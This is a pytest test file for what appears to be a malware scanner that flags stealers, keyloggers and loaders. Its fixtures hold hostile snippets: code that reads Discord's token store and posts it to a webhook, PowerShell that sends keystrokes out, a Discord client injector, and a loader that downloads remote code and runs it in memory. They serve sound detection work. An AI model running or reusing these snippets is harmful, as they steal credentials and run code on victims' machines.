# Anti-Logging Bear by Priest

from __future__ import annotations

import io
from pathlib import Path

import pytest

from antiloggingbear.engine import ScanOptions, Severity, Verdict, scan_path
from samples import make_asar, make_pyinstaller, make_zip

WEBHOOK = "https://discord.com/api/webhooks/123456789012345678/AbCdEf-GhIjKlMnOpQrStUv"
FIXTURES = Path(__file__).parent / "fixtures"


@pytest.fixture
def scan(tmp_path):
    def _scan(name, data, **opts):
        target = tmp_path / name
        target.write_bytes(data)
        return scan_path(str(target), ScanOptions(use_antivirus=False, use_yara=False, **opts))
    return _scan


def checks(report):
    return {f.check for f in report.findings}


def test_pyinstaller_keylogger(scan):
    exe = make_pyinstaller(
        {"main": f"import grabber\nHOOK = '{WEBHOOK}'\ngrabber.start(HOOK)\n"},
        {"grabber": "import keyboard\nimport requests\ndef start(url):\n    keyboard.on_press(lambda e: None)\n",
         "keyboard": "def on_press(cb):\n    pass\n", "requests": "def post(*a, **k):\n    pass\n"})
    report = scan("fps-boost.exe", exe)
    assert "pyinstaller.found" in checks(report)
    assert "pyinstaller.keylogger" in checks(report)
    assert report.verdict is Verdict.DANGEROUS
    assert any("[python] main" in f.path for f in report.files)
    assert any("[python] grabber" in f.path for f in report.files)
    assert "pe.overlay" not in checks(report)


def test_pyinstaller_ordinary_tool_is_clean(scan):
    exe = make_pyinstaller(
        {"main": "import tkinter\nimport settings\nprint('Unit converter ready')\n"},
        {"settings": "UNITS = ['cm', 'inch']\n", "tkinter": "pass\n", "json": "pass\n"})
    report = scan("converter.exe", exe)
    assert "pyinstaller.found" in checks(report)
    assert report.verdict is Verdict.CLEAN


def test_pyinstaller_encrypted_modules(scan):
    exe = make_pyinstaller({"main": "import core\n"}, {"core": "x = 1\n"}, encrypt=("core",))
    assert "pyinstaller.encrypted" in checks(scan("tool.exe", exe))


def test_pyinstaller_damaged_cookie_is_ignored(scan):
    exe = make_pyinstaller({"main": "pass\n"}, {})
    broken = exe[:-80] + b"\xff" * 80
    report = scan("tool.exe", broken)
    assert "pyinstaller.found" not in checks(report)


def test_electron_token_grabber(scan):
    app = make_asar({
        "package.json": b'{"name": "launcher", "main": "main.js"}',
        "main.js": (b"const fs = require('fs');\nconst path = process.env.APPDATA + "
                    b"'\\\\discord\\\\Local Storage\\\\leveldb';\n"
                    b"fetch('" + WEBHOOK.encode() + b"', {method: 'POST', body: fs.readFileSync(path)});\n"),
        "node_modules/left-pad/index.js": b"module.exports = s => s;\n",
    })
    report = scan("app.asar", app)
    assert "asar.found" in checks(report)
    assert report.verdict is Verdict.DANGEROUS
    paths = [f.path for f in report.files]
    assert "app.asar/main.js" in paths
    assert not any("node_modules" in p for p in paths)


def test_electron_inside_zip_is_read(scan):
    app = make_asar({"index.js": b"console.log('hello');\n"})
    report = scan("game.zip", make_zip([("resources/app.asar", app)]))
    assert any(f.path == "resources/app.asar/index.js" for f in report.files)
    assert report.verdict is Verdict.CLEAN


def test_dotnet_keyhook_sample(scan):
    pytest.importorskip("dnfile")
    report = scan("FpsBoost.dll", (FIXTURES / "dotnet_keyhook.dll").read_bytes())
    evidence = " ".join(f.detail for f in report.findings)
    assert "GetAsyncKeyState (P/Invoke)" in evidence
    assert any(f.check == "pe.keylogger" and f.severity is Severity.CRITICAL for f in report.findings)


def test_7z_contents_are_scanned(scan):
    py7zr = pytest.importorskip("py7zr")
    buffer = io.BytesIO()
    with py7zr.SevenZipFile(buffer, "w") as archive:
        archive.writestr(b"Thanks for playing\n", "readme.txt")
        archive.writestr(f"$k=GetAsyncKeyState; iwr -Method Post '{WEBHOOK}' -Body $log".encode(), "tools/run.ps1")
    report = scan("cheats.7z", buffer.getvalue())
    assert any(f.path == "cheats.7z/tools/run.ps1" for f in report.files)
    assert "archive.unsupported" not in checks(report)
    assert report.verdict is not Verdict.CLEAN


def test_7z_inside_zip(scan):
    py7zr = pytest.importorskip("py7zr")
    buffer = io.BytesIO()
    with py7zr.SevenZipFile(buffer, "w") as archive:
        archive.writestr(b"hello\n", "notes.txt")
    report = scan("pack.zip", make_zip([("inner.7z", buffer.getvalue())]))
    assert any(f.path == "inner.7z/notes.txt" for f in report.files)
    assert report.verdict is Verdict.CLEAN


def test_7z_encrypted_headers(scan):
    py7zr = pytest.importorskip("py7zr")
    buffer = io.BytesIO()
    with py7zr.SevenZipFile(buffer, "w", password="secret", header_encryption=True) as archive:
        archive.writestr(b"payload", "setup.exe")
    assert "archive.encrypted" in checks(scan("locked.7z", buffer.getvalue()))


def test_rar_fixture(scan):
    pytest.importorskip("rarfile", exc_type=ImportError)
    sample = FIXTURES / "sample.rar"
    if not sample.exists():
        pytest.skip("no RAR fixture")
    report = scan("sample.rar", sample.read_bytes())
    assert "archive.unsupported" not in checks(report)
    assert len(report.files) > 1 or "archive.rar-names-only" in checks(report)


def test_rar_with_hidden_names_is_flagged(scan):
    pytest.importorskip("rarfile", exc_type=ImportError)
    report = scan("locked.rar", (FIXTURES / "locked.rar").read_bytes())
    assert "archive.encrypted" in checks(report)
    assert report.verdict is not Verdict.CLEAN


def test_huge_minified_script_is_fast(scan):
    import time
    line = ('{"application/vnd.curl.car":{source:"apache"},"x-ogg":{source:"iana"}};' * 40000).encode()
    started = time.monotonic()
    report = scan("bundle.min.js", line)
    assert time.monotonic() - started < 20
    assert report.verdict is Verdict.CLEAN


def test_placeholder_discord_token_is_ignored(scan):
    text = b"const example = 'xxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx'; fetch('/api/settings');\n"
    assert scan("settings.js", text).verdict is Verdict.CLEAN


def test_discord_loading_its_own_core_is_clean(scan):
    code = b"const core = require(path.join(modulesDir, 'discord_desktop_core'));\nfetch('https://discord.com/api/v9/gateway');\n"
    assert scan("bootstrap.js", code).verdict is Verdict.CLEAN


def test_injecting_into_discord_is_caught(scan):
    code = (b"const target = path.join(process.env.LOCALAPPDATA, 'Discord', 'app-1.0', 'modules', "
            b"'discord_desktop_core-1', 'discord_desktop_core', 'index.js');\n"
            b"fs.writeFileSync(target, payload);\nfetch('" + WEBHOOK.encode() + b"', {method: 'POST'});\n")
    assert scan("injector.js", code).verdict is Verdict.DANGEROUS


def test_one_stray_key_marker_is_not_a_keylogger(scan):
    code = b"for (const k in keys) { delete obj[del]; }\nfetch('https://registry.yarnpkg.com/');\n"
    report = scan("tool.js", code)
    assert not any(f.check.endswith("keylog-text") for f in report.findings)


def _needs_7zip():
    from antiloggingbear.engine import external7z
    if not external7z.available():
        pytest.skip("7-Zip not available")


def test_self_extracting_7z_is_opened(scan):
    _needs_7zip()
    py7zr = pytest.importorskip("py7zr")
    from samples import make_pe
    buffer = io.BytesIO()
    with py7zr.SevenZipFile(buffer, "w") as archive:
        archive.writestr(f"iwr -Method Post '{WEBHOOK}' -Body (GetAsyncKeyState 13)".encode(), "payload/run.ps1")
    stub = make_pe({"kernel32.dll": ["ExitProcess", "GetModuleFileNameW", "CreateFileW", "ReadFile"]})
    report = scan("free-skins.exe", stub + b"\x00" * 512 + buffer.getvalue())
    assert "installer.opened" in checks(report)
    assert any(f.path == "free-skins.exe/payload/run.ps1" for f in report.files)
    assert report.verdict is not Verdict.CLEAN


def test_cab_is_opened(scan, tmp_path):
    _needs_7zip()
    import shutil
    import subprocess
    makecab = shutil.which("makecab")
    if not makecab:
        pytest.skip("makecab not available")
    source = tmp_path / "setup.ps1"
    source.write_text(f"Invoke-RestMethod -Uri '{WEBHOOK}' -Method Post -Body $env:COMPUTERNAME")
    subprocess.run([makecab, str(source), str(tmp_path / "pack.cab")], check=True, capture_output=True)
    report = scan("pack.cab", (tmp_path / "pack.cab").read_bytes())
    assert any(f.path == "pack.cab/setup.ps1" for f in report.files)
    assert report.verdict is not Verdict.CLEAN


def test_folder_scan(tmp_path):
    folder = tmp_path / "moonloader"
    (folder / "lib").mkdir(parents=True)
    (folder / "hud.lua").write_text("local imgui = require 'imgui'\nfunction main() wait(-1) end\n")
    (folder / "lib" / "notes.txt").write_text("thanks for downloading")
    (folder / "lib" / "grab.lua").write_text(
        f"local r = require 'requests'\nfunction main() r.post('{WEBHOOK}', sampGetCurrentDialogEditboxText()) end\n")
    (folder / "pack.zip").write_bytes(make_zip([("inner/readme.txt", b"hello")]))
    report = scan_path(str(folder), ScanOptions(use_antivirus=False, use_yara=False))
    paths = {f.path for f in report.files}
    assert {"hud.lua", "lib/notes.txt", "lib/grab.lua", "pack.zip", "pack.zip/inner/readme.txt"} <= paths
    assert report.verdict is Verdict.DANGEROUS
    assert any(f.path == "lib/grab.lua" and f.severity is Severity.CRITICAL for f in report.findings)


def test_giant_one_line_windows_script_is_dangerous(scan):
    junk = "".join(f"x{i}" for i in range(60000))
    code = f"var s=new ActiveXObject('WScript.Shell');var p='{junk}'.split('x').join('');s.Run(p);\n"
    assert scan("invoice.js", code.encode()).verdict is Verdict.DANGEROUS


def test_fileless_loader_is_dangerous(scan):
    code = ("$b = (New-Object Net.WebClient).DownloadData('https://cdn.example.net/a.bin')\n"
            "[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null, $null)\n")
    assert scan("update.ps1", code.encode()).verdict is Verdict.DANGEROUS


def test_windows_script_starting_powershell(scan):
    code = ("Set sh = CreateObject(\"WScript.Shell\")\n"
            "sh.Run \"powershell -nop -w hidden -c Start-Sleep 1\", 0, False\n")
    assert scan("setup.vbs", code.encode()).verdict is not Verdict.CLEAN


def test_gzipped_program_in_base64_is_found(scan):
    import base64
    import gzip

    from samples import make_pe
    payload = base64.b64encode(gzip.compress(make_pe({"kernel32.dll": ["ExitProcess"]}))).decode()
    code = f"$d = '{payload}'\n$x = [Convert]::FromBase64String($d)\n"
    assert "script.payload.embedded-exe" in checks(scan("run.ps1", code.encode()))
